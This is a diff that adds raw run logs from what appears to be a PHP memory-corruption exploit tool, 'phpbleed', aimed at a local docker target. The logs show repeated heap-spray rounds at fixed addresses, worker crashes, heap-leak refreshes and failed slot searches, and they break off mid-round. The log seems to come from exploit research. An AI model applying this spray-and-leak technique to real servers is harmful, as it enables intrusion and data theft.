@@ -4639,3 +4639,1028 @@
 18:29:29Z [R-6] FAILED round 8 (spray slot not found)
 18:29:29Z [#70] [R-6 spray-slot] GET /f rawlen=491
 18:29:29Z === exfil sequence finished without HTTP capture; check docker logs for cat output ===
+18:32:11Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+18:32:11Z [R-6/R-7 round 1] opening fresh worker pin
+18:32:11Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:32:11Z [#1] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:32:11Z [#2] [R-6 spray-slot@0xed3f88a64000] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:32:11Z [#3] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:32:11Z [#4] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:32:11Z [#5] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:32:11Z [#6] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:32:11Z [#7] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:32:11Z [#8] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:32:11Z [#9] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:32:11Z [#10] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:32:11Z [#11] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:32:11Z [#12] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:32:11Z [#13] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:32:11Z [#14] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:32:11Z [#15] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:32:11Z [#16] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:32:11Z [#17] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:32:11Z [#18] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:32:11Z [#19] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:32:11Z [#20] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:32:11Z [#21] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:32:11Z [#22] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:32:11Z [#23] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:32:11Z [#24] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:32:11Z [#25] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:32:11Z [#26] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:32:11Z [#27] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:32:11Z [#28] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:32:11Z [#29] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:32:11Z [#30] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:32:11Z [#31] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:32:11Z [#32] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:32:11Z [#33] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:32:11Z [#34] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:32:11Z [#35] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:32:11Z [#36] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:32:11Z [#37] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:32:11Z [#38] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:32:11Z [#39] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:32:11Z [#40] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=40
+18:34:32Z === phpbleed run start (fresh=False) target 127.0.0.1:8089/index.php ===
+18:34:32Z [R-6/R-7 round 1] opening fresh worker pin
+18:34:32Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:32Z [#1] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:34:32Z [#2] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:32Z [#3] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:32Z [#4] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:32Z [#5] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:32Z [#6] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:32Z [#7] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:32Z [#8] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:32Z [#9] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:32Z [#10] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:32Z [#11] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:32Z [#12] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:32Z [#13] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:32Z [#14] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:32Z [#15] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:32Z [#16] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:32Z [#17] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:32Z [#18] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:32Z [#19] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:32Z [#20] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:32Z [#21] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:32Z [#22] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:32Z [#23] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:32Z [#24] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:32Z [#25] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:32Z [#26] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:32Z [#27] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:32Z [#28] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:32Z [#29] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:32Z [#30] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:32Z [#31] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:32Z [#32] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:32Z [#33] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:32Z [#34] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:32Z [#35] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:32Z [#36] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:32Z [#37] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:32Z [#38] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:32Z [#39] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:32Z [#40] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:32Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:32Z [R-6 round 1] no slot; refreshing R-1 heap leak
+18:34:32Z [#41] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:34:32Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:32Z [#42] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:34:32Z [#43] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:32Z [#44] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:32Z [#45] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:32Z [#46] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:32Z [#47] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:32Z [#48] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:32Z [#49] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:32Z [#50] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:32Z [#51] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:32Z [#52] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:32Z [#53] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:32Z [#54] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:32Z [#55] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:32Z [#56] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:32Z [#57] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:32Z [#58] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:32Z [#59] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:32Z [#60] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:32Z [#61] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:32Z [#62] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:32Z [#63] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:32Z [#64] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:32Z [#65] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:32Z [#66] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:32Z [#67] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:32Z [#68] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:32Z [#69] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:32Z [#70] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:32Z [#71] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:32Z [#72] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:32Z [#73] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:32Z [#74] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:32Z [#75] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:32Z [#76] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:32Z [#77] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:32Z [#78] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:32Z [#79] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:32Z [#80] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:32Z [#81] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:32Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:32Z [R-6] FAILED round 1 (spray slot not found)
+18:34:32Z [R-6/R-7 round 2] opening fresh worker pin
+18:34:32Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:32Z [#82] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:34:32Z [#83] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:32Z [#84] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:32Z [#85] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:32Z [#86] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:32Z [#87] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:32Z [#88] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:32Z [#89] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:32Z [#90] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:32Z [#91] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:32Z [#92] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:32Z [#93] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:32Z [#94] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:32Z [#95] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:32Z [#96] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:32Z [#97] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:32Z [#98] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:32Z [#99] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:32Z [#100] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:32Z [#101] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:32Z [#102] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:33Z [#103] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:33Z [#104] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:33Z [#105] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:33Z [#106] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:33Z [#107] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:33Z [#108] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:33Z [#109] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:33Z [#110] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:33Z [#111] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:33Z [#112] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:33Z [#113] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:33Z [#114] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:33Z [#115] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:33Z [#116] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:33Z [#117] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:33Z [#118] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:33Z [#119] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:33Z [#120] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:33Z [#121] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:33Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:33Z [R-6 round 2] no slot; refreshing R-1 heap leak
+18:34:33Z [#122] [R-6 spray-slot] ok rawlen=9804 bodylen=9580
+18:34:33Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:33Z [#123] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410372 bodylen=410153 chunked=True n=1
+18:34:33Z [#124] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:33Z [#125] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:33Z [#126] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:33Z [#127] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:33Z [#128] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:33Z [#129] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:33Z [#130] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:33Z [#131] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:33Z [#132] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:33Z [#133] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:33Z [#134] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:33Z [#135] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:33Z [#136] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:33Z [#137] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:33Z [#138] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:33Z [#139] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:33Z [#140] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:33Z [#141] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:33Z [#142] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:33Z [#143] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:33Z [#144] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:33Z [#145] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:33Z [#146] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:33Z [#147] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:33Z [#148] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:33Z [#149] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:33Z [#150] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:33Z [#151] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
+18:34:33Z [#152] [R-6 spray-slot@0xed3f88a66440] pin-ok rawlen=173 bodylen=0 chunked=False n=30
+18:34:33Z [#153] [R-6 spray-slot@0xed3f88a66580] pin-ok rawlen=173 bodylen=0 chunked=False n=31
+18:34:33Z [#154] [R-6 spray-slot@0xed3f88a666c0] pin-ok rawlen=173 bodylen=0 chunked=False n=32
+18:34:33Z [#155] [R-6 spray-slot@0xed3f88a66800] pin-ok rawlen=173 bodylen=0 chunked=False n=33
+18:34:33Z [#156] [R-6 spray-slot@0xed3f88a66940] pin-ok rawlen=173 bodylen=0 chunked=False n=34
+18:34:33Z [#157] [R-6 spray-slot@0xed3f88a66a80] pin-ok rawlen=173 bodylen=0 chunked=False n=35
+18:34:33Z [#158] [R-6 spray-slot@0xed3f88a66bc0] pin-ok rawlen=173 bodylen=0 chunked=False n=36
+18:34:33Z [#159] [R-6 spray-slot@0xed3f88a66d00] pin-ok rawlen=173 bodylen=0 chunked=False n=37
+18:34:33Z [#160] [R-6 spray-slot@0xed3f88a66e40] pin-ok rawlen=173 bodylen=0 chunked=False n=38
+18:34:33Z [#161] [R-6 spray-slot@0xed3f88a66f80] pin-ok rawlen=173 bodylen=0 chunked=False n=39
+18:34:33Z [#162] [R-6 spray-slot@0xed3f88a670c0] PIN-CRASH/conn-closed rawlen=0
+18:34:33Z [R-6] pin budget/dead at slot 40; aborting round
+18:34:33Z [R-6] FAILED round 2 (spray slot not found)
+18:34:33Z [R-6/R-7 round 3] opening fresh worker pin
+18:34:33Z [pin] keep-alive worker pin opened (worker now pinned, attempt 1)
+18:34:33Z [#163] [R-6 spray-slot@0xed3f88a00040] pin-ok rawlen=410388 bodylen=410169 chunked=True n=1
+18:34:33Z [#164] [R-6 spray-slot@0xed3f88a64140] pin-ok rawlen=173 bodylen=0 chunked=False n=2
+18:34:33Z [#165] [R-6 spray-slot@0xed3f88a64280] pin-ok rawlen=173 bodylen=0 chunked=False n=3
+18:34:33Z [#166] [R-6 spray-slot@0xed3f88a643c0] pin-ok rawlen=173 bodylen=0 chunked=False n=4
+18:34:33Z [#167] [R-6 spray-slot@0xed3f88a64500] pin-ok rawlen=173 bodylen=0 chunked=False n=5
+18:34:33Z [#168] [R-6 spray-slot@0xed3f88a64640] pin-ok rawlen=173 bodylen=0 chunked=False n=6
+18:34:33Z [#169] [R-6 spray-slot@0xed3f88a64780] pin-ok rawlen=173 bodylen=0 chunked=False n=7
+18:34:33Z [#170] [R-6 spray-slot@0xed3f88a648c0] pin-ok rawlen=173 bodylen=0 chunked=False n=8
+18:34:33Z [#171] [R-6 spray-slot@0xed3f88a64a00] pin-ok rawlen=173 bodylen=0 chunked=False n=9
+18:34:33Z [#172] [R-6 spray-slot@0xed3f88a64b40] pin-ok rawlen=173 bodylen=0 chunked=False n=10
+18:34:33Z [#173] [R-6 spray-slot@0xed3f88a64c80] pin-ok rawlen=173 bodylen=0 chunked=False n=11
+18:34:33Z [#174] [R-6 spray-slot@0xed3f88a64dc0] pin-ok rawlen=173 bodylen=0 chunked=False n=12
+18:34:33Z [#175] [R-6 spray-slot@0xed3f88a64f00] pin-ok rawlen=173 bodylen=0 chunked=False n=13
+18:34:33Z [#176] [R-6 spray-slot@0xed3f88a65040] pin-ok rawlen=173 bodylen=0 chunked=False n=14
+18:34:33Z [#177] [R-6 spray-slot@0xed3f88a65180] pin-ok rawlen=173 bodylen=0 chunked=False n=15
+18:34:33Z [#178] [R-6 spray-slot@0xed3f88a652c0] pin-ok rawlen=173 bodylen=0 chunked=False n=16
+18:34:33Z [#179] [R-6 spray-slot@0xed3f88a65400] pin-ok rawlen=173 bodylen=0 chunked=False n=17
+18:34:33Z [#180] [R-6 spray-slot@0xed3f88a65540] pin-ok rawlen=173 bodylen=0 chunked=False n=18
+18:34:33Z [#181] [R-6 spray-slot@0xed3f88a65680] pin-ok rawlen=173 bodylen=0 chunked=False n=19
+18:34:33Z [#182] [R-6 spray-slot@0xed3f88a657c0] pin-ok rawlen=173 bodylen=0 chunked=False n=20
+18:34:33Z [#183] [R-6 spray-slot@0xed3f88a65900] pin-ok rawlen=173 bodylen=0 chunked=False n=21
+18:34:33Z [#184] [R-6 spray-slot@0xed3f88a65a40] pin-ok rawlen=173 bodylen=0 chunked=False n=22
+18:34:33Z [#185] [R-6 spray-slot@0xed3f88a65b80] pin-ok rawlen=173 bodylen=0 chunked=False n=23
+18:34:33Z [#186] [R-6 spray-slot@0xed3f88a65cc0] pin-ok rawlen=173 bodylen=0 chunked=False n=24
+18:34:33Z [#187] [R-6 spray-slot@0xed3f88a65e00] pin-ok rawlen=173 bodylen=0 chunked=False n=25
+18:34:33Z [#188] [R-6 spray-slot@0xed3f88a65f40] pin-ok rawlen=173 bodylen=0 chunked=False n=26
+18:34:33Z [#189] [R-6 spray-slot@0xed3f88a66080] pin-ok rawlen=173 bodylen=0 chunked=False n=27
+18:34:33Z [#190] [R-6 spray-slot@0xed3f88a661c0] pin-ok rawlen=173 bodylen=0 chunked=False n=28
+18:34:33Z [#191] [R-6 spray-slot@0xed3f88a66300] pin-ok rawlen=173 bodylen=0 chunked=False n=29
